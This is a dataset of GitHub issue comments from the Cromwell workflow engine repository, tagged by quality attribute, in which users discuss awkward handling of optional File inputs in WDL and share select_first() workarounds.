the basename of an optional file. . Even less intuitive is the fact that if you separate out the select_first() part into a new variable, my workaround doesn't work anymore. ```; String maybe_tsv = select_first([tsv_file_",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245893354
https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245893354:314,Modifiability,variab,variable,314,"I'm not sure how miniwdl handles this, I'm just testing this one on Cromwell for now. But putting aside the spec, miniwdl, and Cromwell here, when I write some sort of code in any particular language, I always expect at least one of these to work:. * `if defined(variable) then do_something(variable)`; * `if type(variable) is not None then do_something(variable)` or its close cousin `if variable is not None then do_something(variable)`; * `if exists(file) then do_something(file)`. In Cromwell-flavored WDL (perhaps all WDL?), it doesn't seem you can do any of those. The first one will throw an ""Expected X but got X?"" error and the other two don't seem to have equivalents. Compare that to Python, where I can explicitly do the second or third one, and implicitly do the first one. In Python, if I try to do_something() on a variable that isn't defined, Python throws a Name Error, but in Cromwell!WDL trying to do_something() on an optional throws a ""Expected X but got X?"" error that doesn't tell you if X is actually defined or not. The fact that the WDL spec doesn't explicitly say that defined() can coerce a variable doesn't really matter -- I would wager that most people would expect this sort of thing to work. It seems to be a logical conclusion that if a file exists, you can do something to that file, without having to call a totally different function to create a new variable. I did check your workaround, but it throws the same error. So, my understanding is the only way to do this in Cromwell is this:. ```; String basename_tsv = basename(select_first([tsv_file_input, ""bogus fallback value""])); String arg_tsv = if(basename_tsv == ""bogus fallback value"") then """" else basename_tsv; ```. ...which just isn't intuitive. It shouldn't be so complicated to get the basename of an optional file. . Even less intuitive is the fact that if you separate out the select_first() part into a new variable, my workaround doesn't work anymore. ```; String maybe_tsv = select_first([tsv_file_",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245893354
https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245893354:354,Modifiability,variab,variable,354,"I'm not sure how miniwdl handles this, I'm just testing this one on Cromwell for now. But putting aside the spec, miniwdl, and Cromwell here, when I write some sort of code in any particular language, I always expect at least one of these to work:. * `if defined(variable) then do_something(variable)`; * `if type(variable) is not None then do_something(variable)` or its close cousin `if variable is not None then do_something(variable)`; * `if exists(file) then do_something(file)`. In Cromwell-flavored WDL (perhaps all WDL?), it doesn't seem you can do any of those. The first one will throw an ""Expected X but got X?"" error and the other two don't seem to have equivalents. Compare that to Python, where I can explicitly do the second or third one, and implicitly do the first one. In Python, if I try to do_something() on a variable that isn't defined, Python throws a Name Error, but in Cromwell!WDL trying to do_something() on an optional throws a ""Expected X but got X?"" error that doesn't tell you if X is actually defined or not. The fact that the WDL spec doesn't explicitly say that defined() can coerce a variable doesn't really matter -- I would wager that most people would expect this sort of thing to work. It seems to be a logical conclusion that if a file exists, you can do something to that file, without having to call a totally different function to create a new variable. I did check your workaround, but it throws the same error. So, my understanding is the only way to do this in Cromwell is this:. ```; String basename_tsv = basename(select_first([tsv_file_input, ""bogus fallback value""])); String arg_tsv = if(basename_tsv == ""bogus fallback value"") then """" else basename_tsv; ```. ...which just isn't intuitive. It shouldn't be so complicated to get the basename of an optional file. . Even less intuitive is the fact that if you separate out the select_first() part into a new variable, my workaround doesn't work anymore. ```; String maybe_tsv = select_first([tsv_file_",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245893354
https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245893354:389,Modifiability,variab,variable,389,"I'm not sure how miniwdl handles this, I'm just testing this one on Cromwell for now. But putting aside the spec, miniwdl, and Cromwell here, when I write some sort of code in any particular language, I always expect at least one of these to work:. * `if defined(variable) then do_something(variable)`; * `if type(variable) is not None then do_something(variable)` or its close cousin `if variable is not None then do_something(variable)`; * `if exists(file) then do_something(file)`. In Cromwell-flavored WDL (perhaps all WDL?), it doesn't seem you can do any of those. The first one will throw an ""Expected X but got X?"" error and the other two don't seem to have equivalents. Compare that to Python, where I can explicitly do the second or third one, and implicitly do the first one. In Python, if I try to do_something() on a variable that isn't defined, Python throws a Name Error, but in Cromwell!WDL trying to do_something() on an optional throws a ""Expected X but got X?"" error that doesn't tell you if X is actually defined or not. The fact that the WDL spec doesn't explicitly say that defined() can coerce a variable doesn't really matter -- I would wager that most people would expect this sort of thing to work. It seems to be a logical conclusion that if a file exists, you can do something to that file, without having to call a totally different function to create a new variable. I did check your workaround, but it throws the same error. So, my understanding is the only way to do this in Cromwell is this:. ```; String basename_tsv = basename(select_first([tsv_file_input, ""bogus fallback value""])); String arg_tsv = if(basename_tsv == ""bogus fallback value"") then """" else basename_tsv; ```. ...which just isn't intuitive. It shouldn't be so complicated to get the basename of an optional file. . Even less intuitive is the fact that if you separate out the select_first() part into a new variable, my workaround doesn't work anymore. ```; String maybe_tsv = select_first([tsv_file_",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245893354
https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245893354:428,Modifiability,variab,variable,428,"I'm not sure how miniwdl handles this, I'm just testing this one on Cromwell for now. But putting aside the spec, miniwdl, and Cromwell here, when I write some sort of code in any particular language, I always expect at least one of these to work:. * `if defined(variable) then do_something(variable)`; * `if type(variable) is not None then do_something(variable)` or its close cousin `if variable is not None then do_something(variable)`; * `if exists(file) then do_something(file)`. In Cromwell-flavored WDL (perhaps all WDL?), it doesn't seem you can do any of those. The first one will throw an ""Expected X but got X?"" error and the other two don't seem to have equivalents. Compare that to Python, where I can explicitly do the second or third one, and implicitly do the first one. In Python, if I try to do_something() on a variable that isn't defined, Python throws a Name Error, but in Cromwell!WDL trying to do_something() on an optional throws a ""Expected X but got X?"" error that doesn't tell you if X is actually defined or not. The fact that the WDL spec doesn't explicitly say that defined() can coerce a variable doesn't really matter -- I would wager that most people would expect this sort of thing to work. It seems to be a logical conclusion that if a file exists, you can do something to that file, without having to call a totally different function to create a new variable. I did check your workaround, but it throws the same error. So, my understanding is the only way to do this in Cromwell is this:. ```; String basename_tsv = basename(select_first([tsv_file_input, ""bogus fallback value""])); String arg_tsv = if(basename_tsv == ""bogus fallback value"") then """" else basename_tsv; ```. ...which just isn't intuitive. It shouldn't be so complicated to get the basename of an optional file. . Even less intuitive is the fact that if you separate out the select_first() part into a new variable, my workaround doesn't work anymore. ```; String maybe_tsv = select_first([tsv_file_",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245893354
https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245893354:830,Modifiability,variab,variable,830,"I'm not sure how miniwdl handles this, I'm just testing this one on Cromwell for now. But putting aside the spec, miniwdl, and Cromwell here, when I write some sort of code in any particular language, I always expect at least one of these to work:. * `if defined(variable) then do_something(variable)`; * `if type(variable) is not None then do_something(variable)` or its close cousin `if variable is not None then do_something(variable)`; * `if exists(file) then do_something(file)`. In Cromwell-flavored WDL (perhaps all WDL?), it doesn't seem you can do any of those. The first one will throw an ""Expected X but got X?"" error and the other two don't seem to have equivalents. Compare that to Python, where I can explicitly do the second or third one, and implicitly do the first one. In Python, if I try to do_something() on a variable that isn't defined, Python throws a Name Error, but in Cromwell!WDL trying to do_something() on an optional throws a ""Expected X but got X?"" error that doesn't tell you if X is actually defined or not. The fact that the WDL spec doesn't explicitly say that defined() can coerce a variable doesn't really matter -- I would wager that most people would expect this sort of thing to work. It seems to be a logical conclusion that if a file exists, you can do something to that file, without having to call a totally different function to create a new variable. I did check your workaround, but it throws the same error. So, my understanding is the only way to do this in Cromwell is this:. ```; String basename_tsv = basename(select_first([tsv_file_input, ""bogus fallback value""])); String arg_tsv = if(basename_tsv == ""bogus fallback value"") then """" else basename_tsv; ```. ...which just isn't intuitive. It shouldn't be so complicated to get the basename of an optional file. . Even less intuitive is the fact that if you separate out the select_first() part into a new variable, my workaround doesn't work anymore. ```; String maybe_tsv = select_first([tsv_file_",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245893354
https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245893354:1119,Modifiability,variab,variable,1119,"ell here, when I write some sort of code in any particular language, I always expect at least one of these to work:. * `if defined(variable) then do_something(variable)`; * `if type(variable) is not None then do_something(variable)` or its close cousin `if variable is not None then do_something(variable)`; * `if exists(file) then do_something(file)`. In Cromwell-flavored WDL (perhaps all WDL?), it doesn't seem you can do any of those. The first one will throw an ""Expected X but got X?"" error and the other two don't seem to have equivalents. Compare that to Python, where I can explicitly do the second or third one, and implicitly do the first one. In Python, if I try to do_something() on a variable that isn't defined, Python throws a Name Error, but in Cromwell!WDL trying to do_something() on an optional throws a ""Expected X but got X?"" error that doesn't tell you if X is actually defined or not. The fact that the WDL spec doesn't explicitly say that defined() can coerce a variable doesn't really matter -- I would wager that most people would expect this sort of thing to work. It seems to be a logical conclusion that if a file exists, you can do something to that file, without having to call a totally different function to create a new variable. I did check your workaround, but it throws the same error. So, my understanding is the only way to do this in Cromwell is this:. ```; String basename_tsv = basename(select_first([tsv_file_input, ""bogus fallback value""])); String arg_tsv = if(basename_tsv == ""bogus fallback value"") then """" else basename_tsv; ```. ...which just isn't intuitive. It shouldn't be so complicated to get the basename of an optional file. . Even less intuitive is the fact that if you separate out the select_first() part into a new variable, my workaround doesn't work anymore. ```; String maybe_tsv = select_first([tsv_file_input, ""bogus fallback value""]); String basename_tsv = basename(maybe_tsv); String arg_tsv = if(basename_tsv == ""bogus fallback val",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245893354
https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245893354:1387,Modifiability,variab,variable,1387,"ype(variable) is not None then do_something(variable)` or its close cousin `if variable is not None then do_something(variable)`; * `if exists(file) then do_something(file)`. In Cromwell-flavored WDL (perhaps all WDL?), it doesn't seem you can do any of those. The first one will throw an ""Expected X but got X?"" error and the other two don't seem to have equivalents. Compare that to Python, where I can explicitly do the second or third one, and implicitly do the first one. In Python, if I try to do_something() on a variable that isn't defined, Python throws a Name Error, but in Cromwell!WDL trying to do_something() on an optional throws a ""Expected X but got X?"" error that doesn't tell you if X is actually defined or not. The fact that the WDL spec doesn't explicitly say that defined() can coerce a variable doesn't really matter -- I would wager that most people would expect this sort of thing to work. It seems to be a logical conclusion that if a file exists, you can do something to that file, without having to call a totally different function to create a new variable. I did check your workaround, but it throws the same error. So, my understanding is the only way to do this in Cromwell is this:. ```; String basename_tsv = basename(select_first([tsv_file_input, ""bogus fallback value""])); String arg_tsv = if(basename_tsv == ""bogus fallback value"") then """" else basename_tsv; ```. ...which just isn't intuitive. It shouldn't be so complicated to get the basename of an optional file. . Even less intuitive is the fact that if you separate out the select_first() part into a new variable, my workaround doesn't work anymore. ```; String maybe_tsv = select_first([tsv_file_input, ""bogus fallback value""]); String basename_tsv = basename(maybe_tsv); String arg_tsv = if(basename_tsv == ""bogus fallback value"") then """" else basename_tsv; ```. _Failed to process task definition 'parse_terratable' (reason 1 of 1): Failed to process expression 'select_first([basename_tsv, basename(may",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245893354
https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245893354:1908,Modifiability,variab,variable,1908,"r, but in Cromwell!WDL trying to do_something() on an optional throws a ""Expected X but got X?"" error that doesn't tell you if X is actually defined or not. The fact that the WDL spec doesn't explicitly say that defined() can coerce a variable doesn't really matter -- I would wager that most people would expect this sort of thing to work. It seems to be a logical conclusion that if a file exists, you can do something to that file, without having to call a totally different function to create a new variable. I did check your workaround, but it throws the same error. So, my understanding is the only way to do this in Cromwell is this:. ```; String basename_tsv = basename(select_first([tsv_file_input, ""bogus fallback value""])); String arg_tsv = if(basename_tsv == ""bogus fallback value"") then """" else basename_tsv; ```. ...which just isn't intuitive. It shouldn't be so complicated to get the basename of an optional file. . Even less intuitive is the fact that if you separate out the select_first() part into a new variable, my workaround doesn't work anymore. ```; String maybe_tsv = select_first([tsv_file_input, ""bogus fallback value""]); String basename_tsv = basename(maybe_tsv); String arg_tsv = if(basename_tsv == ""bogus fallback value"") then """" else basename_tsv; ```. _Failed to process task definition 'parse_terratable' (reason 1 of 1): Failed to process expression 'select_first([basename_tsv, basename(maybe_tsv)])' (reason 1 of 1): Invalid parameter 'IdentifierLookup(maybe_tsv)'. Expected 'File' but got 'String?'_. In other words -- it is unnecessarily complicated to work with optionals, and the workarounds that do exist appear to be inconsistent. It seems this could all be sidestepped by having ""if X exists, do something to X"" logic. (I want to make clear I'm coming at this from a perspective of someone who uses WDL heavily, mostly in the context of Terra/Cromwell, and wants wider adoption. From my experience, oddities like this are serious obstacles for both newcome",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245893354
https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245893354:48,Testability,test,testing,48,"I'm not sure how miniwdl handles this, I'm just testing this one on Cromwell for now. But putting aside the spec, miniwdl, and Cromwell here, when I write some sort of code in any particular language, I always expect at least one of these to work:. * `if defined(variable) then do_something(variable)`; * `if type(variable) is not None then do_something(variable)` or its close cousin `if variable is not None then do_something(variable)`; * `if exists(file) then do_something(file)`. In Cromwell-flavored WDL (perhaps all WDL?), it doesn't seem you can do any of those. The first one will throw an ""Expected X but got X?"" error and the other two don't seem to have equivalents. Compare that to Python, where I can explicitly do the second or third one, and implicitly do the first one. In Python, if I try to do_something() on a variable that isn't defined, Python throws a Name Error, but in Cromwell!WDL trying to do_something() on an optional throws a ""Expected X but got X?"" error that doesn't tell you if X is actually defined or not. The fact that the WDL spec doesn't explicitly say that defined() can coerce a variable doesn't really matter -- I would wager that most people would expect this sort of thing to work. It seems to be a logical conclusion that if a file exists, you can do something to that file, without having to call a totally different function to create a new variable. I did check your workaround, but it throws the same error. So, my understanding is the only way to do this in Cromwell is this:. ```; String basename_tsv = basename(select_first([tsv_file_input, ""bogus fallback value""])); String arg_tsv = if(basename_tsv == ""bogus fallback value"") then """" else basename_tsv; ```. ...which just isn't intuitive. It shouldn't be so complicated to get the basename of an optional file. . Even less intuitive is the fact that if you separate out the select_first() part into a new variable, my workaround doesn't work anymore. ```; String maybe_tsv = select_first([tsv_file_",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245893354
https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245893354:1242,Testability,log,logical,1242,"ype(variable) is not None then do_something(variable)` or its close cousin `if variable is not None then do_something(variable)`; * `if exists(file) then do_something(file)`. In Cromwell-flavored WDL (perhaps all WDL?), it doesn't seem you can do any of those. The first one will throw an ""Expected X but got X?"" error and the other two don't seem to have equivalents. Compare that to Python, where I can explicitly do the second or third one, and implicitly do the first one. In Python, if I try to do_something() on a variable that isn't defined, Python throws a Name Error, but in Cromwell!WDL trying to do_something() on an optional throws a ""Expected X but got X?"" error that doesn't tell you if X is actually defined or not. The fact that the WDL spec doesn't explicitly say that defined() can coerce a variable doesn't really matter -- I would wager that most people would expect this sort of thing to work. It seems to be a logical conclusion that if a file exists, you can do something to that file, without having to call a totally different function to create a new variable. I did check your workaround, but it throws the same error. So, my understanding is the only way to do this in Cromwell is this:. ```; String basename_tsv = basename(select_first([tsv_file_input, ""bogus fallback value""])); String arg_tsv = if(basename_tsv == ""bogus fallback value"") then """" else basename_tsv; ```. ...which just isn't intuitive. It shouldn't be so complicated to get the basename of an optional file. . Even less intuitive is the fact that if you separate out the select_first() part into a new variable, my workaround doesn't work anymore. ```; String maybe_tsv = select_first([tsv_file_input, ""bogus fallback value""]); String basename_tsv = basename(maybe_tsv); String arg_tsv = if(basename_tsv == ""bogus fallback value"") then """" else basename_tsv; ```. _Failed to process task definition 'parse_terratable' (reason 1 of 1): Failed to process expression 'select_first([basename_tsv, basename(may",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245893354
https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245893354:2640,Testability,log,logic,2640," do_something() on an optional throws a ""Expected X but got X?"" error that doesn't tell you if X is actually defined or not. The fact that the WDL spec doesn't explicitly say that defined() can coerce a variable doesn't really matter -- I would wager that most people would expect this sort of thing to work. It seems to be a logical conclusion that if a file exists, you can do something to that file, without having to call a totally different function to create a new variable. I did check your workaround, but it throws the same error. So, my understanding is the only way to do this in Cromwell is this:. ```; String basename_tsv = basename(select_first([tsv_file_input, ""bogus fallback value""])); String arg_tsv = if(basename_tsv == ""bogus fallback value"") then """" else basename_tsv; ```. ...which just isn't intuitive. It shouldn't be so complicated to get the basename of an optional file. . Even less intuitive is the fact that if you separate out the select_first() part into a new variable, my workaround doesn't work anymore. ```; String maybe_tsv = select_first([tsv_file_input, ""bogus fallback value""]); String basename_tsv = basename(maybe_tsv); String arg_tsv = if(basename_tsv == ""bogus fallback value"") then """" else basename_tsv; ```. _Failed to process task definition 'parse_terratable' (reason 1 of 1): Failed to process expression 'select_first([basename_tsv, basename(maybe_tsv)])' (reason 1 of 1): Invalid parameter 'IdentifierLookup(maybe_tsv)'. Expected 'File' but got 'String?'_. In other words -- it is unnecessarily complicated to work with optionals, and the workarounds that do exist appear to be inconsistent. It seems this could all be sidestepped by having ""if X exists, do something to X"" logic. (I want to make clear I'm coming at this from a perspective of someone who uses WDL heavily, mostly in the context of Terra/Cromwell, and wants wider adoption. From my experience, oddities like this are serious obstacles for both newcomers and heavy users like myself.)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245893354
https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245893354:1731,Usability,intuit,intuitive,1731,"o the second or third one, and implicitly do the first one. In Python, if I try to do_something() on a variable that isn't defined, Python throws a Name Error, but in Cromwell!WDL trying to do_something() on an optional throws a ""Expected X but got X?"" error that doesn't tell you if X is actually defined or not. The fact that the WDL spec doesn't explicitly say that defined() can coerce a variable doesn't really matter -- I would wager that most people would expect this sort of thing to work. It seems to be a logical conclusion that if a file exists, you can do something to that file, without having to call a totally different function to create a new variable. I did check your workaround, but it throws the same error. So, my understanding is the only way to do this in Cromwell is this:. ```; String basename_tsv = basename(select_first([tsv_file_input, ""bogus fallback value""])); String arg_tsv = if(basename_tsv == ""bogus fallback value"") then """" else basename_tsv; ```. ...which just isn't intuitive. It shouldn't be so complicated to get the basename of an optional file. . Even less intuitive is the fact that if you separate out the select_first() part into a new variable, my workaround doesn't work anymore. ```; String maybe_tsv = select_first([tsv_file_input, ""bogus fallback value""]); String basename_tsv = basename(maybe_tsv); String arg_tsv = if(basename_tsv == ""bogus fallback value"") then """" else basename_tsv; ```. _Failed to process task definition 'parse_terratable' (reason 1 of 1): Failed to process expression 'select_first([basename_tsv, basename(maybe_tsv)])' (reason 1 of 1): Invalid parameter 'IdentifierLookup(maybe_tsv)'. Expected 'File' but got 'String?'_. In other words -- it is unnecessarily complicated to work with optionals, and the workarounds that do exist appear to be inconsistent. It seems this could all be sidestepped by having ""if X exists, do something to X"" logic. (I want to make clear I'm coming at this from a perspective of someone who uses W",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245893354
https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245893354:1826,Usability,intuit,intuitive,1826,"r, but in Cromwell!WDL trying to do_something() on an optional throws a ""Expected X but got X?"" error that doesn't tell you if X is actually defined or not. The fact that the WDL spec doesn't explicitly say that defined() can coerce a variable doesn't really matter -- I would wager that most people would expect this sort of thing to work. It seems to be a logical conclusion that if a file exists, you can do something to that file, without having to call a totally different function to create a new variable. I did check your workaround, but it throws the same error. So, my understanding is the only way to do this in Cromwell is this:. ```; String basename_tsv = basename(select_first([tsv_file_input, ""bogus fallback value""])); String arg_tsv = if(basename_tsv == ""bogus fallback value"") then """" else basename_tsv; ```. ...which just isn't intuitive. It shouldn't be so complicated to get the basename of an optional file. . Even less intuitive is the fact that if you separate out the select_first() part into a new variable, my workaround doesn't work anymore. ```; String maybe_tsv = select_first([tsv_file_input, ""bogus fallback value""]); String basename_tsv = basename(maybe_tsv); String arg_tsv = if(basename_tsv == ""bogus fallback value"") then """" else basename_tsv; ```. _Failed to process task definition 'parse_terratable' (reason 1 of 1): Failed to process expression 'select_first([basename_tsv, basename(maybe_tsv)])' (reason 1 of 1): Invalid parameter 'IdentifierLookup(maybe_tsv)'. Expected 'File' but got 'String?'_. In other words -- it is unnecessarily complicated to work with optionals, and the workarounds that do exist appear to be inconsistent. It seems this could all be sidestepped by having ""if X exists, do something to X"" logic. (I want to make clear I'm coming at this from a perspective of someone who uses WDL heavily, mostly in the context of Terra/Cromwell, and wants wider adoption. From my experience, oddities like this are serious obstacles for both newcome",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245893354
https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245893354:2663,Usability,clear,clear,2663," do_something() on an optional throws a ""Expected X but got X?"" error that doesn't tell you if X is actually defined or not. The fact that the WDL spec doesn't explicitly say that defined() can coerce a variable doesn't really matter -- I would wager that most people would expect this sort of thing to work. It seems to be a logical conclusion that if a file exists, you can do something to that file, without having to call a totally different function to create a new variable. I did check your workaround, but it throws the same error. So, my understanding is the only way to do this in Cromwell is this:. ```; String basename_tsv = basename(select_first([tsv_file_input, ""bogus fallback value""])); String arg_tsv = if(basename_tsv == ""bogus fallback value"") then """" else basename_tsv; ```. ...which just isn't intuitive. It shouldn't be so complicated to get the basename of an optional file. . Even less intuitive is the fact that if you separate out the select_first() part into a new variable, my workaround doesn't work anymore. ```; String maybe_tsv = select_first([tsv_file_input, ""bogus fallback value""]); String basename_tsv = basename(maybe_tsv); String arg_tsv = if(basename_tsv == ""bogus fallback value"") then """" else basename_tsv; ```. _Failed to process task definition 'parse_terratable' (reason 1 of 1): Failed to process expression 'select_first([basename_tsv, basename(maybe_tsv)])' (reason 1 of 1): Invalid parameter 'IdentifierLookup(maybe_tsv)'. Expected 'File' but got 'String?'_. In other words -- it is unnecessarily complicated to work with optionals, and the workarounds that do exist appear to be inconsistent. It seems this could all be sidestepped by having ""if X exists, do something to X"" logic. (I want to make clear I'm coming at this from a perspective of someone who uses WDL heavily, mostly in the context of Terra/Cromwell, and wants wider adoption. From my experience, oddities like this are serious obstacles for both newcomers and heavy users like myself.)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245893354
https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245900745:16,Usability,feedback,feedback,16,"Thanks for your feedback. Since this is more of a WDL spec item than a Cromwell one, I suggest creating a new [Issue](https://github.com/openwdl/wdl/issues), [PR](https://github.com/openwdl/wdl/pulls), or [Discussion](https://github.com/openwdl/wdl/discussions) over at OpenWDL.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245900745
https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245918821:458,Availability,echo,echo,458,"Sorry, I put the `select_first` in the wrong place. This works:; ```; String tsv_arg = if defined(tsv_file_input) then basename(select_first([tsv_file_input])) else """"; ```. My `test.wdl`:; ```; version 1.0. workflow W {; input { File? tsv_file_input }. String tsv_arg = if defined(tsv_file_input) then basename(select_first([tsv_file_input])) else """". call T { input: s = tsv_arg }; output { String out = T.out }; }. task T {; input { String s }; command { echo ~{s} }; output { String out = read_string(stdout()) }; }; ```; I checked and this works with both `miniwdl run` and `java -jar cromwell.jar run`.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245918821
https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245918821:178,Testability,test,test,178,"Sorry, I put the `select_first` in the wrong place. This works:; ```; String tsv_arg = if defined(tsv_file_input) then basename(select_first([tsv_file_input])) else """"; ```. My `test.wdl`:; ```; version 1.0. workflow W {; input { File? tsv_file_input }. String tsv_arg = if defined(tsv_file_input) then basename(select_first([tsv_file_input])) else """". call T { input: s = tsv_arg }; output { String out = T.out }; }. task T {; input { String s }; command { echo ~{s} }; output { String out = read_string(stdout()) }; }; ```; I checked and this works with both `miniwdl run` and `java -jar cromwell.jar run`.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245918821
https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245922919:33,Availability,down,down,33,"Nice, handy to have this written down for future Google searchers.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245922919
https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245932498:445,Testability,log,logic,445,"In early miniwdl development we did [explore](https://github.com/chanzuckerberg/miniwdl/pull/42/files) recognizing that x is non-optional within the `if (defined(x))` consequent, but I believe we dropped that after some [spec clarifications](https://github.com/openwdl/wdl/pull/290). That implementation is not too complicated but you can get into questions of how deeply to statically analyze the if expression, e.g. if it's a compound boolean logic that maybe you can get into and prove implies `defined(x)`. And the `select_first([x])` idiom, as illustrated in @pshapiro4broad corrected version, does work but I agree it's a very common roadbump for all WDLers.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245932498
https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245982086:350,Availability,echo,echo,350,"@pshapiro4broad Unfortunately I'm still having issues with select_first() (apparently?) acting inconsistently. This passes miniwdl and Cromwell:. ```; version 1.0. task T {; 	input {; 		File? tsv_file_input; 		String tsv_arg = if defined(tsv_file_input) then basename(select_first([tsv_file_input, ""/path/to/file.txt""])) else """"; 	}. 	command <<<; 		echo ~{tsv_arg}; 	>>>. }. workflow W {; 	input {; 		File? tsv_file_input; 	}. 	call T {; 		input:; 			tsv_file_input = tsv_file_input; 	}; }; ```. This passes miniwdl, but fails Cromwell:. ```; version 1.0. task T {; 	input {; 		File? tsv_file_input; 		String foo = select_first([tsv_file_input, ""/path/to/file.txt""]); 		String tsv_arg = if defined(tsv_file_input) then basename(foo) else """"; 	}. 	command <<<; 		echo ~{tsv_arg}; 	>>>. }. workflow W {; 	input {; 		File? tsv_file_input; 	}. 	call T {; 		input:; 			tsv_file_input = tsv_file_input; 	}; }; ```; Cromwell's error is:; > 14:27:13.383 [main] ERROR io.dockstore.client.cli.ArgumentUtility - Problem parsing WDL file: Failed to process task definition 'T' (reason 1 of 1): Failed to process expression 'select_first([tsv_arg, if defined(tsv_file_input) then basename(foo) else """"])' (reason 1 of 1): Invalid parameter 'IdentifierLookup(foo)'. Expected 'File' but got 'String?'; > 14:27:13.385 [main] ERROR io.dockstore.client.cli.ArgumentUtility - wdl.draft3.parser.WdlParser$SyntaxError: Failed to process task definition 'T' (reason 1 of 1): Failed to process expression 'select_first([tsv_arg, if defined(tsv_file_input) then basename(foo) else """"])' (reason 1 of 1): Invalid parameter 'IdentifierLookup(foo)'. Expected 'File' but got 'String?'. To me, that seems to indicate that Cromwell's implentation of select_first() isn't consistently returning the same type, depending on where it is being used. It looks like in the first example it is correctly returning a String but in the second example it's returning a String?, but I don't see a meaningful difference between the two.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245982086
